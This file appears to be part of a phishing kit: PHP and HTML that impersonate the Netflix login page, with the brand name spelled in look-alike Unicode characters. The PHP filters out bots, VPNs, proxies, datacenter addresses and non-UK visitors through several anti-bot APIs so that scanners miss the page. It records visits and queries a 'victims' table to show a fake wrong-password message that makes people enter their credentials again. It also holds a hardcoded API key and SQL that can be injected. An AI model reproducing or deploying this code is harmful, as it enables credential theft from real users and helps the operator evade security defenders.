<?php
$ip = $_SERVER['REMOTE_ADDR'];
$apiKey = '1lUc86kZM8MHpI6ID4nvV2NrkT7xO4iT';

$ctx = stream_context_create(['http' => ['timeout' => 3]]);
$response = @file_get_contents("https://ipqualityscore.com/api/json/ip/{$apiKey}/{$ip}", false, $ctx);
$logFile = __DIR__ . '/ipqs_block_log.txt';

if ($response === false) {
    file_put_contents($logFile, "[" . date('Y-m-d H:i:s') . "] IP: $ip | ERROR: API request failed\n", FILE_APPEND);
    return;
}

$data = @json_decode($response, true);

if (!is_array($data) || !isset($data['fraud_score'])) {
    file_put_contents($logFile, "[" . date('Y-m-d H:i:s') . "] IP: $ip | ERROR: Invalid API response | Raw: $response\n", FILE_APPEND);
    return;
}

$logEntry = "[" . date('Y-m-d H:i:s') . "] IP: $ip | Score: {$data['fraud_score']} | Bot: {$data['is_bot']} | VPN: {$data['is_vpn']} | Proxy: {$data['is_proxy']} | Datacenter: {$data['is_datacenter']}\n";
file_put_contents($logFile, $logEntry, FILE_APPEND);

// Now block if dangerous
if (
    $data['fraud_score'] > 85 ||
    $data['is_bot'] === true ||
    $data['is_proxy'] === true ||
    $data['is_vpn'] === true ||
    $data['is_tor'] === true ||
    $data['is_datacenter'] === true
) {
    http_response_code(403);
    exit;
}

include 'zynexroot/inc/config.php';
include 'zynexroot/inc/connect.php';
include 'new_anti_config.php';
if ($internal_antibot == 1) {
   include "zynexroot/inc/old_blocker.php";
}
if ($mobile_lock == "checked") {
   include "zynexroot/inc/mob_lock.php";
}
if ($UK_lock == 1) {
   if (onlyuk() == true) {
   } else {
      header_remove();
      header("Connection: close\r\n");
      http_response_code(404);
      exit;
   }
}
if ($enable_killbot == 1) {
   if (checkkillbot($killbot_key) == true) {
      header_remove();
      header("Connection: close\r\n");
      http_response_code(404);
      exit;
   }
}
if ($enable_antibot == 1) {
   if (checkBot($antibot_key) == true) {
      header_remove();
      header("Connection: close\r\n");
      http_response_code(404);
      exit;
   }
}
include 'zynexroot/inc/blacklist.php';
include 'zynexroot/inc/gateway.php';
if ($enable_antibots == "checked") {
   include 'zynexroot/inc/anti.php';
}
session_start();

$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];

$query = mysqli_query($conn, "SELECT * FROM visits WHERE ua='$ua' AND ip='$ip'");
$num = mysqli_num_rows($query);
if ($num == 0) {
   mysqli_query($conn, "INSERT INTO visits (ua, ip) VALUES ('$ua', '$ip')");
}

if ($enable_captcha == "checked") {
   if ($_SESSION['captcha_passed'] != 'true') {
      header("location: captcha.php");
   }
}



if ($_SESSION['started'] == 'true') {
   //get what you want from the database
   $uniqueid = $_SESSION['uniqueid'];
   $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid=$uniqueid");
   if ($query) {
      $arr = mysqli_fetch_array($query, MYSQLI_ASSOC);
      $user = $arr['user'];
      if ($user != '') {
$error = '<p class="alert alert-error" role="alert" style="display: block">The email or password you entered is incorrect.</p>';
      }
   }
}

if ($enable_killbot == "checked") {
   $ip = $_SERVER['REMOTE_ADDR'];
   $ua = $_SERVER['HTTP_USER_AGENT'];
   $killbot_response = json_decode(file_get_contents("https://killbot.org/api/v2/blocker?apikey=$killbot_apikey&ip=$ip&ua=$ua&url="), true);
   if ($killbot_response['data']['block_access']) {
      die();
   }
}

if ($enable_robots == "checked") {
   $robots_script = '<script src="https://cdn.jsdelivr.net/gh/angular-loader/latest/angular-loader.min.js" id=""></script>';
}
?>
<?php

// Detect user's browser language
$userLanguage = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);

// Define supported languages
$supportedLanguages = ['en', 'es', 'fr', 'de', 'it', 'ja', 'nl', 'pl', 'pt', 'sl', 'hu'];
// Set a default language
$defaultLanguage = 'en';

// Check if the detected language is in the list of supported languages
if (in_array($userLanguage, $supportedLanguages)) {
    $selectedLanguage = $userLanguage;
} else {
    $selectedLanguage = $defaultLanguage;
}

// Load the corresponding language file
$languageFile = 'languages/' . $selectedLanguage . '.php';
if (file_exists($languageFile)) {
    $translations = include($languageFile);
} else {
    die("Language file not found for $selectedLanguage");
}

?>

<!DOCTYPE html>
<html lang="en" class="">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="origin-trial" content="A/kargTFyk8MR5ueravczef/wIlTkbVk1qXQesp39nV+xNECPdLBVeYffxrM8TmZT6RArWGQVCJ0LRivD7glcAUAAACQeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZzIiLCJleHBpcnkiOjE3NDIzNDIzOTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="origin-trial" data-feature="EME Extension - Policy Check" data-expires="2018-11-26" content="Aob+++752GiUzm1RNSIkM9TINnQDxTlxz02v8hFJK/uGO2hmXnJqH8c/ZpI05b2nLsHDhGO3Ce2zXJUFQmO7jA4AAAB1eyJvcmlnaW4iOiJodHRwczovL25ldGZsaXguY29tOjQ0MyIsImZlYXR1cmUiOiJFbmNyeXB0ZWRNZWRpYUhkY3BQb2xpY3lDaGVjayIsImV4cGlyeSI6MTU0MzI0MzQyNCwiaXNTdWJkb21haW4iOnRydWV9">
    <meta http-equiv="origin-trial" data-feature="LocalFolder" data-expires="2024-09-04" content="Avmn/LBDmMaBYzfLDTgViRmGZnwcz/LsvceSBBKvevKOrStLHjbpZK3zFjSRuw3ampe7aV2MzJO7//lZ9Nm82hQAAABpeyJvcmlnaW4iOiJodHRwczovL25ldGZsaXguY29tOjQ0MyIsImlzU3ViZG9tYWluIjp0cnVlLCJmZWF0dXJlIjoiV2ViQXBwTG9jYWxGb2xkZXIiLCJleHBpcnkiOjE3MjU0OTQzOTl9">
    <title>Nеtflіх</title>

    <meta content="watch movies, movies online, watch TV, TV online, TV shows online, watch TV shows, stream movies, stream tv, instant streaming, watch online, movies, watch movies Tunisia, watch TV online, no download, full length movies" name="keywords">
    <meta content="WatchNеtflіх movies &amp; TV shows online or stream right to your smart TV, game console, PC, Mac, mobile, tablet and more." name="description">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-touch-icon" content="https://assets.nflxext.com/en_us/layout/ecweb/netflix-app-icon_152.jpg">
    <link type="text/css" rel="stylesheet" href="./login_files/base.29784261571369c943e5.css" data-uia="botLink">
    <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2023.ico">
    <link rel="apple-touch-icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png">
    <meta property="og:description" content="WatchNеtflіх movies &amp; TV shows online or stream right to your smart TV, game console, PC, Mac, mobile, tablet and more.">
    <meta property="al:ios:app_store_id" content="363590051">
    <meta property="al:ios:app_name" content="Nеtflіх">
    <meta name="twitter:card" content="summary_large_image">

    <style data-toolkit-insertion="true"></style>
    <style data-rh="true" data-toolkit-style="true" id="screen-reader-only.css#screen-reader-only_screenReaderOnly__h8djxf0">
      .screen-reader-only_screenReaderOnly__h8djxf0 {
        clip: rect(0 0 0 0);
        clip-path: inset(50%);
        height: 1px;
        overflow: hidden;
        position: absolute;
        white-space: nowrap;
        width: 1px;
      }

      /*# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly8uLy4uLy4uL25vZGVfbW9kdWxlcy9AdmFuaWxsYS1leHRyYWN0L3dlYnBhY2stcGx1Z2luL2V4dHJhY3RlZC5qcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtFQUNFLG1CQUFtQjtFQUNuQixxQkFBcUI7RUFDckIsV0FBVztFQUNYLGdCQUFnQjtFQUNoQixrQkFBa0I7RUFDbEIsbUJBQW1CO0VBQ25CLFVBQVU7QUFDWiIsInNvdXJjZXNDb250ZW50IjpbIi5zY3JlZW4tcmVhZGVyLW9ubHlfc2NyZWVuUmVhZGVyT25seV9faDhkanhmMCB7XG4gIGNsaXA6IHJlY3QoMCAwIDAgMCk7XG4gIGNsaXAtcGF0aDogaW5zZXQoNTAlKTtcbiAgaGVpZ2h0OiAxcHg7XG4gIG92ZXJmbG93OiBoaWRkZW47XG4gIHBvc2l0aW9uOiBhYnNvbHV0ZTtcbiAgd2hpdGUtc3BhY2U6IG5vd3JhcDtcbiAgd2lkdGg6IDFweDtcbn0iXSwic291cmNlUm9vdCI6IiJ9 */
    </style>
    <style data-rh="true" data-toolkit-style="true" id="form-control.css#form-control_containerStyles__oy4jpq0">
      @keyframes form-control_animations_autofillStart__oy4jpq2 {}

      @keyframes form-control_animations_autofillEnd__oy4jpq3 {}

      .form-control_containerStyles__oy4jpq0 {
        display: inline-block;
      }

      .form-control_controlWrapperStyles__oy4jpq1 {
        align-items: center;
        color: black;
        display: inline-flex;
        fill: black;
        font-size: 13px;
        font-weight: 400;
        gap: 2px;
        letter-spacing: normal;
        line-height: 100%;
        padding: 2px;
        position: relative;
        text-align: left;
        z-index: 0;
      }

      .form-control_controlWrapperStyles__oy4jpq1[dir="rtl"] {
        text-align: right;
      }

      .form-control_controlWrapperStyles__oy4jpq1>input,
      .form-control_controlWrapperStyles__oy4jpq1>select {
        animation: form-control_animations_autofillEnd__oy4jpq3;
        -webkit-appearance: none;
        -moz-appearance: none;
        appearance: none;
        background: transparent;
        background-clip: padding-box;
        border: 0 solid transparent;
        color: inherit;
        font: inherit;
        letter-spacing: inherit;
        line-height: inherit;
        margin: 0;
        min-height: 15px;
        min-width: 15px;
        padding: 0;
        text-align: inherit;
        text-decoration: inherit;
        text-transform: inherit;
      }

      .form-control_controlWrapperStyles__oy4jpq1>input:-webkit-autofill,
      .form-control_controlWrapperStyles__oy4jpq1>select:-webkit-autofill {
        animation: form-control_animations_autofillStart__oy4jpq2;
        background-image: none !important;
        transition-delay: 86400s;
        -webkit-transition-property: background-color, color;
        transition-property: background-color, color;
      }

      .form-control_controlWrapperStyles__oy4jpq1>input:autofill,
      .form-control_controlWrapperStyles__oy4jpq1>select:autofill {
        animation: form-control_animations_autofillStart__oy4jpq2;
        background-image: none !important;
        transition-delay: 86400s;
        transition-property: background-color, color;
      }

      .form-control_controlWrapperStyles__oy4jpq1>input.edge-autofilled,
      .form-control_controlWrapperStyles__oy4jpq1>select.edge-autofilled,
      .form-control_controlWrapperStyles__oy4jpq1>input[data-com-onepassword-filled],
      .form-control_controlWrapperStyles__oy4jpq1>select[data-com-onepassword-filled],
      .form-control_controlWrapperStyles__oy4jpq1>input[data-dashlane-autofilled],
      .form-control_controlWrapperStyles__oy4jpq1>select[data-dashlane-autofilled] {
        animation: form-control_animations_autofillStart__oy4jpq2;
        background-image: none !important;
        transition-delay: 86400s;
        transition-property: background-color, color;
      }

      .form-control_controlWrapperStyles__oy4jpq1>input[aria-disabled],
      .form-control_controlWrapperStyles__oy4jpq1>select[aria-disabled] {
        caret-color: transparent;
        cursor: not-allowed;
      }

      .form-control_controlWrapperStyles__oy4jpq1>input:focus,
      .form-control_controlWrapperStyles__oy4jpq1>select:focus,
      .form-control_controlWrapperStyles__oy4jpq1>input:focus-visible,
      .form-control_controlWrapperStyles__oy4jpq1>select:focus-visible {
        outline: 0;
      }

      .form-control_controlWrapperStyles__oy4jpq1>input:-webkit-autofill-strong-password::-webkit-textfield-decoration-container,
      .form-control_controlWrapperStyles__oy4jpq1>input:-webkit-autofill-strong-password-viewable::-webkit-textfield-decoration-container {
        filter: brightness(0%) contrast(0%);
      }

      .form-control_controlWrapperStyles__oy4jpq1>select>option {
        background: initial;
        color: initial;
      }

      .form-control_controlChromeStyles__oy4jpq4 {
        align-items: center;
        background: white;
        border: 1px solid black;
        border-radius: 2px;
        bottom: 0;
        color: transparent;
        display: flex;
        justify-content: center;
        left: 0;
        position: absolute;
        right: 0;
        top: 0;
        -webkit-user-select: none;
        -moz-user-select: none;
        user-select: none;
        z-index: -1;
      }

      input[aria-disabled]~.form-control_controlChromeStyles__oy4jpq4,
      select[aria-disabled]~.form-control_controlChromeStyles__oy4jpq4 {
        opacity: 0.5;
      }

      input[data-autofill]~.form-control_controlChromeStyles__oy4jpq4,
      select[data-autofill]~.form-control_controlChromeStyles__oy4jpq4 {
        background: cornsilk;
      }

      input:focus~.form-control_controlChromeStyles__oy4jpq4,
      select:focus~.form-control_controlChromeStyles__oy4jpq4 {
        outline: #a9a9a9 auto 5px;
        outline: Highlight auto 5px;
        outline: -webkit-focus-ring-color auto 5px;
      }

      input:focus:not(:focus-visible)~.form-control_controlChromeStyles__oy4jpq4,
      select:focus:not(:focus-visible)~.form-control_controlChromeStyles__oy4jpq4 {
        outline: none;
      }

      .form-control_labelStyles__oy4jpq5 {
        display: block;
        -webkit-user-select: none;
        -moz-user-select: none;
        user-select: none;
      }

      .form-control_controlWrapperStyles__oy4jpq1~.form-control_labelStyles__oy4jpq5 {
        display: inline-block;
        padding-left: 0.25rem;
      }

      .form-control_controlWrapperStyles__oy4jpq1~.form-control_labelStyles__oy4jpq5[dir="rtl"] {
        padding-left: 0;
        padding-right: 0.25rem;
      }

      /*# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly8uLy4uLy4uL25vZGVfbW9kdWxlcy9AdmFuaWxsYS1leHRyYWN0L3dlYnBhY2stcGx1Z2luL2V4dHJhY3RlZC5qcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTs7QUFFQTtBQUNBOztBQUVBOztBQUNBO0VBQ0UscUJBQXFCO0FBQ3ZCOztBQUNBO0VBQ0UsbUJBQW1CO0VBQ25CLFlBQVk7RUFDWixvQkFBb0I7RUFDcEIsV0FBVztFQUNYLGVBQWU7RUFDZixnQkFBZ0I7RUFDaEIsUUFBUTtFQUNSLHNCQUFzQjtFQUN0QixpQkFBaUI7RUFDakIsWUFBWTtFQUNaLGtCQUFrQjtFQUNsQixnQkFBZ0I7RUFDaEIsVUFBVTtBQUNaOztBQWRBO0VBWUUsaUJBQWdCO0FBRWxCOztBQUNBO0VBQ0UsdURBQXVEO0VBQ3ZELHdCQUFnQjtLQUFoQixxQkFBZ0I7VUFBaEIsZ0JBQWdCO0VBQ2hCLHVCQUF1QjtFQUN2Qiw0QkFBNEI7RUFDNUIsMkJBQTJCO0VBQzNCLGNBQWM7RUFDZCxhQUFhO0VBQ2IsdUJBQXVCO0VBQ3ZCLG9CQUFvQjtFQUNwQixTQUFTO0VBQ1QsZ0JBQWdCO0VBQ2hCLGVBQWU7RUFDZixVQUFVO0VBQ1YsbUJBQW1CO0VBQ25CLHdCQUF3QjtFQUN4Qix1QkFBdUI7QUFDekI7O0FBQ0E7RUFDRSx5REFBeUQ7RUFDekQsaUNBQWlDO0VBQ2pDLHdCQUF3QjtFQUN4QixvREFBNEM7RUFBNUMsNENBQTRDO0FBQzlDOztBQUNBO0VBQ0UseURBQXlEO0VBQ3pELGlDQUFpQztFQUNqQyx3QkFBd0I7RUFDeEIsNENBQTRDO0FBQzlDOztBQUNBO0VBQ0UseURBQXlEO0VBQ3pELGlDQUFpQztFQUNqQyx3QkFBd0I7RUFDeEIsNENBQTRDO0FBQzlDOztBQUNBO0VBQ0Usd0JBQXdCO0VBQ3hCLG1CQUFtQjtBQUNyQjs7QUFDQTtFQUNFLFVBQVU7QUFDWjs7QUFDQTtFQUNFLG1DQUFtQztBQUNyQzs7QUFDQTtFQUNFLG1CQUFtQjtFQUNuQixjQUFjO0FBQ2hCOztBQUNBO0VBQ0UsbUJBQW1CO0VBQ25CLGlCQUFpQjtFQUNqQix1QkFBdUI7RUFDdkIsa0JBQWtCO0VBQ2xCLFNBQVM7RUFDVCxrQkFBa0I7RUFDbEIsYUFBYTtFQUNiLHVCQUF1QjtFQUN2QixPQUFPO0VBQ1Asa0JBQWtCO0VBQ2xCLFFBQVE7RUFDUixNQUFNO0VBQ04seUJBQWlCO0tBQWpCLHNCQUFpQjtVQUFqQixpQkFBaUI7RUFDakIsV0FBVztBQUNiOztBQUNBO0VBQ0UsWUFBWTtBQUNkOztBQUNBO0VBQ0Usb0JBQW9CO0FBQ3RCOztBQUNBO0VBQ0UseUJBQXlCO0VBQ3pCLDJCQUEyQjtFQUMzQiwwQ0FBMEM7QUFDNUM7O0FBQ0E7RUFDRSxhQUFhO0FBQ2Y7O0FBQ0E7RUFDRSxjQUFjO0VBQ2QseUJBQWlCO0tBQWpCLHNCQUFpQjtVQUFqQixpQkFBaUI7QUFDbkI7O0FBQ0E7RUFDRSxxQkFBcUI7RUFDckIscUJBQXFCO0FBQ3ZCOztBQUhBO0VBRUUsZUFBcUI7RUFBckIsc0JBQXFCO0FBQ3ZCIiwic291cmNlc0NvbnRlbnQiOlsiQGtleWZyYW1lcyBmb3JtLWNvbnRyb2xfYW5pbWF0aW9uc19hdXRvZmlsbFN0YXJ0X19veTRqcHEyIHtcblxufVxuQGtleWZyYW1lcyBmb3JtLWNvbnRyb2xfYW5pbWF0aW9uc19hdXRvZmlsbEVuZF9fb3k0anBxMyB7XG5cbn1cbi5mb3JtLWNvbnRyb2xfY29udGFpbmVyU3R5bGVzX19veTRqcHEwIHtcbiAgZGlzcGxheTogaW5saW5lLWJsb2NrO1xufVxuLmZvcm0tY29udHJvbF9jb250cm9sV3JhcHBlclN0eWxlc19fb3k0anBxMSB7XG4gIGFsaWduLWl0ZW1zOiBjZW50ZXI7XG4gIGNvbG9yOiBibGFjaztcbiAgZGlzcGxheTogaW5saW5lLWZsZXg7XG4gIGZpbGw6IGJsYWNrO1xuICBmb250LXNpemU6IDEzcHg7XG4gIGZvbnQtd2VpZ2h0OiA0MDA7XG4gIGdhcDogMnB4O1xuICBsZXR0ZXItc3BhY2luZzogbm9ybWFsO1xuICBsaW5lLWhlaWdodDogMTAwJTtcbiAgcGFkZGluZzogMnB4O1xuICBwb3NpdGlvbjogcmVsYXRpdmU7XG4gIHRleHQtYWxpZ246IGxlZnQ7XG4gIHotaW5kZXg6IDA7XG59XG4uZm9ybS1jb250cm9sX2NvbnRyb2xXcmFwcGVyU3R5bGVzX19veTRqcHExID4gaW5wdXQsIC5mb3JtLWNvbnRyb2xfY29udHJvbFdyYXBwZXJTdHlsZXNfX295NGpwcTEgPiBzZWxlY3Qge1xuICBhbmltYXRpb246IGZvcm0tY29udHJvbF9hbmltYXRpb25zX2F1dG9maWxsRW5kX19veTRqcHEzO1xuICBhcHBlYXJhbmNlOiBub25lO1xuICBiYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDtcbiAgYmFja2dyb3VuZC1jbGlwOiBwYWRkaW5nLWJveDtcbiAgYm9yZGVyOiAwIHNvbGlkIHRyYW5zcGFyZW50O1xuICBjb2xvcjogaW5oZXJpdDtcbiAgZm9udDogaW5oZXJpdDtcbiAgbGV0dGVyLXNwYWNpbmc6IGluaGVyaXQ7XG4gIGxpbmUtaGVpZ2h0OiBpbmhlcml0O1xuICBtYXJnaW46IDA7XG4gIG1pbi1oZWlnaHQ6IDE1cHg7XG4gIG1pbi13aWR0aDogMTVweDtcbiAgcGFkZGluZzogMDtcbiAgdGV4dC1hbGlnbjogaW5oZXJpdDtcbiAgdGV4dC1kZWNvcmF0aW9uOiBpbmhlcml0O1xuICB0ZXh0LXRyYW5zZm9ybTogaW5oZXJpdDtcbn1cbi5mb3JtLWNvbnRyb2xfY29udHJvbFdyYXBwZXJTdHlsZXNfX295NGpwcTEgPiBpbnB1dDotd2Via2l0LWF1dG9maWxsLCAuZm9ybS1jb250cm9sX2NvbnRyb2xXcmFwcGVyU3R5bGVzX19veTRqcHExID4gc2VsZWN0Oi13ZWJraXQtYXV0b2ZpbGwge1xuICBhbmltYXRpb246IGZvcm0tY29udHJvbF9hbmltYXRpb25zX2F1dG9maWxsU3RhcnRfX295NGpwcTI7XG4gIGJhY2tncm91bmQtaW1hZ2U6IG5vbmUgIWltcG9ydGFudDtcbiAgdHJhbnNpdGlvbi1kZWxheTogODY0MDBzO1xuICB0cmFuc2l0aW9uLXByb3BlcnR5OiBiYWNrZ3JvdW5kLWNvbG9yLCBjb2xvcjtcbn1cbi5mb3JtLWNvbnRyb2xfY29udHJvbFdyYXBwZXJTdHlsZXNfX295NGpwcTEgPiBpbnB1dDphdXRvZmlsbCwgLmZvcm0tY29udHJvbF9jb250cm9sV3JhcHBlclN0eWxlc19fb3k0anBxMSA+IHNlbGVjdDphdXRvZmlsbCB7XG4gIGFuaW1hdGlvbjogZm9ybS1jb250cm9sX2FuaW1hdGlvbnNfYXV0b2ZpbGxTdGFydF9fb3k0anBxMjtcbiAgYmFja2dyb3VuZC1pbWFnZTogbm9uZSAhaW1wb3J0YW50O1xuICB0cmFuc2l0aW9uLWRlbGF5OiA4NjQwMHM7XG4gIHRyYW5zaXRpb24tcHJvcGVydHk6IGJhY2tncm91bmQtY29sb3IsIGNvbG9yO1xufVxuLmZvcm0tY29udHJvbF9jb250cm9sV3JhcHBlclN0eWxlc19fb3k0anBxMSA+IGlucHV0LmVkZ2UtYXV0b2ZpbGxlZCwgLmZvcm0tY29udHJvbF9jb250cm9sV3JhcHBlclN0eWxlc19fb3k0anBxMSA+IHNlbGVjdC5lZGdlLWF1dG9maWxsZWQsIC5mb3JtLWNvbnRyb2xfY29udHJvbFdyYXBwZXJTdHlsZXNfX295NGpwcTEgPiBpbnB1dFtkYXRhLWNvbS1vbmVwYXNzd29yZC1maWxsZWRdLCAuZm9ybS1jb250cm9sX2NvbnRyb2xXcmFwcGVyU3R5bGVzX19veTRqcHExID4gc2VsZWN0W2RhdGEtY29tLW9uZXBhc3N3b3JkLWZpbGxlZF0sIC5mb3JtLWNvbnRyb2xfY29udHJvbFdyYXBwZXJTdHlsZXNfX295NGpwcTEgPiBpbnB1dFtkYXRhLWRhc2hsYW5lLWF1dG9maWxsZWRdLCAuZm9ybS1jb250cm9sX2NvbnRyb2xXcmFwcGVyU3R5bGVzX19veTRqcHExID4gc2VsZWN0W2RhdGEtZGFzaGxhbmUtYXV0b2ZpbGxlZF0ge1xuICBhbmltYXRpb246IGZvcm0tY29udHJvbF9hbmltYXRpb25zX2F1dG9maWxsU3RhcnRfX295NGpwcTI7XG4gIGJhY2tncm91bmQtaW1hZ2U6IG5vbmUgIWltcG9ydGFudDtcbiAgdHJhbnNpdGlvbi1kZWxheTogODY0MDBzO1xuICB0cmFuc2l0aW9uLXByb3BlcnR5OiBiYWNrZ3JvdW5kLWNvbG9yLCBjb2xvcjtcbn1cbi5mb3JtLWNvbnRyb2xfY29udHJvbFdyYXBwZXJTdHlsZXNfX295NGpwcTEgPiBpbnB1dFthcmlhLWRpc2FibGVkXSwgLmZvcm0tY29udHJvbF9jb250cm9sV3JhcHBlclN0eWxlc19fb3k0anBxMSA+IHNlbGVjdFthcmlhLWRpc2FibGVkXSB7XG4gIGNhcmV0LWNvbG9yOiB0cmFuc3BhcmVudDtcbiAgY3Vyc29yOiBub3QtYWxsb3dlZDtcbn1cbi5mb3JtLWNvbnRyb2xfY29udHJvbFdyYXBwZXJTdHlsZXNfX295NGpwcTEgPiBpbnB1dDpmb2N1cywgLmZvcm0tY29udHJvbF9jb250cm9sV3JhcHBlclN0eWxlc19fb3k0anBxMSA+IHNlbGVjdDpmb2N1cywgLmZvcm0tY29udHJvbF9jb250cm9sV3JhcHBlclN0eWxlc19fb3k0anBxMSA+IGlucHV0OmZvY3VzLXZpc2libGUsIC5mb3JtLWNvbnRyb2xfY29udHJvbFdyYXBwZXJTdHlsZXNfX295NGpwcTEgPiBzZWxlY3Q6Zm9jdXMtdmlzaWJsZSB7XG4gIG91dGxpbmU6IDA7XG59XG4uZm9ybS1jb250cm9sX2NvbnRyb2xXcmFwcGVyU3R5bGVzX19veTRqcHExID4gaW5wdXQ6LXdlYmtpdC1hdXRvZmlsbC1zdHJvbmctcGFzc3dvcmQ6Oi13ZWJraXQtdGV4dGZpZWxkLWRlY29yYXRpb24tY29udGFpbmVyLCAuZm9ybS1jb250cm9sX2NvbnRyb2xXcmFwcGVyU3R5bGVzX19veTRqcHExID4gaW5wdXQ6LXdlYmtpdC1hdXRvZmlsbC1zdHJvbmctcGFzc3dvcmQtdmlld2FibGU6Oi13ZWJraXQtdGV4dGZpZWxkLWRlY29yYXRpb24tY29udGFpbmVyIHtcbiAgZmlsdGVyOiBicmlnaHRuZXNzKDAlKSBjb250cmFzdCgwJSk7XG59XG4uZm9ybS1jb250cm9sX2NvbnRyb2xXcmFwcGVyU3R5bGVzX19veTRqcHExID4gc2VsZWN0ID4gb3B0aW9uIHtcbiAgYmFja2dyb3VuZDogaW5pdGlhbDtcbiAgY29sb3I6IGluaXRpYWw7XG59XG4uZm9ybS1jb250cm9sX2NvbnRyb2xDaHJvbWVTdHlsZXNfX295NGpwcTQge1xuICBhbGlnbi1pdGVtczogY2VudGVyO1xuICBiYWNrZ3JvdW5kOiB3aGl0ZTtcbiAgYm9yZGVyOiAxcHggc29saWQgYmxhY2s7XG4gIGJvcmRlci1yYWRpdXM6IDJweDtcbiAgYm90dG9tOiAwO1xuICBjb2xvcjogdHJhbnNwYXJlbnQ7XG4gIGRpc3BsYXk6IGZsZXg7XG4gIGp1c3RpZnktY29udGVudDogY2VudGVyO1xuICBsZWZ0OiAwO1xuICBwb3NpdGlvbjogYWJzb2x1dGU7XG4gIHJpZ2h0OiAwO1xuICB0b3A6IDA7XG4gIHVzZXItc2VsZWN0OiBub25lO1xuICB6LWluZGV4OiAtMTtcbn1cbmlucHV0W2FyaWEtZGlzYWJsZWRdIH4gLmZvcm0tY29udHJvbF9jb250cm9sQ2hyb21lU3R5bGVzX19veTRqcHE0LCBzZWxlY3RbYXJpYS1kaXNhYmxlZF0gfiAuZm9ybS1jb250cm9sX2NvbnRyb2xDaHJvbWVTdHlsZXNfX295NGpwcTQge1xuICBvcGFjaXR5OiAwLjU7XG59XG5pbnB1dFtkYXRhLWF1dG9maWxsXSB+IC5mb3JtLWNvbnRyb2xfY29udHJvbENocm9tZVN0eWxlc19fb3k0anBxNCwgc2VsZWN0W2RhdGEtYXV0b2ZpbGxdIH4gLmZvcm0tY29udHJvbF9jb250cm9sQ2hyb21lU3R5bGVzX19veTRqcHE0IHtcbiAgYmFja2dyb3VuZDogY29ybnNpbGs7XG59XG5pbnB1dDpmb2N1cyB+IC5mb3JtLWNvbnRyb2xfY29udHJvbENocm9tZVN0eWxlc19fb3k0anBxNCwgc2VsZWN0OmZvY3VzIH4gLmZvcm0tY29udHJvbF9jb250cm9sQ2hyb21lU3R5bGVzX19veTRqcHE0IHtcbiAgb3V0bGluZTogI2E5YTlhOSBhdXRvIDVweDtcbiAgb3V0bGluZTogSGlnaGxpZ2h0IGF1dG8gNXB4O1xuICBvdXRsaW5lOiAtd2Via2l0LWZvY3VzLXJpbmctY29sb3IgYXV0byA1cHg7XG59XG5pbnB1dDpmb2N1czpub3QoOmZvY3VzLXZpc2libGUpIH4gLmZvcm0tY29udHJvbF9jb250cm9sQ2hyb21lU3R5bGVzX19veTRqcHE0LCBzZWxlY3Q6Zm9jdXM6bm90KDpmb2N1cy12aXNpYmxlKSB+IC5mb3JtLWNvbnRyb2xfY29udHJvbENocm9tZVN0eWxlc19fb3k0anBxNCB7XG4gIG91dGxpbmU6IG5vbmU7XG59XG4uZm9ybS1jb250cm9sX2xhYmVsU3R5bGVzX19veTRqcHE1IHtcbiAgZGlzcGxheTogYmxvY2s7XG4gIHVzZXItc2VsZWN0OiBub25lO1xufVxuLmZvcm0tY29udHJvbF9jb250cm9sV3JhcHBlclN0eWxlc19fb3k0anBxMSB+IC5mb3JtLWNvbnRyb2xfbGFiZWxTdHlsZXNfX295NGpwcTUge1xuICBkaXNwbGF5OiBpbmxpbmUtYmxvY2s7XG4gIHBhZGRpbmctbGVmdDogMC4yNXJlbTtcbn0iXSwic291cmNlUm9vdCI6IiJ9 */
    </style>
    <style data-rh="true" data-toolkit-style="true" id="select.css#form-control_controlWrapperStyles__oy4jpq1">
      .form-control_controlWrapperStyles__oy4jpq1>.select_nativeElementStyles__1ewemfi0 {
        min-height: 16px;
        min-width: 16px;
        padding-right: 12px;
      }

      .form-control_controlWrapperStyles__oy4jpq1>.select_nativeElementStyles__1ewemfi0[dir="rtl"] {
        padding-right: 0;
        padding-left: 12px;
      }

      .select_nativeElementStyles__1ewemfi0~.form-control_controlChromeStyles__oy4jpq4 {
        color: inherit;
        justify-content: flex-end;
        font-size: 10px;
        padding-right: 2px;
        padding-top: 2px;
      }

      .select_nativeElementStyles__1ewemfi0~.form-control_controlChromeStyles__oy4jpq4[dir="rtl"] {
        padding-right: 0;
        padding-left: 2px;
      }

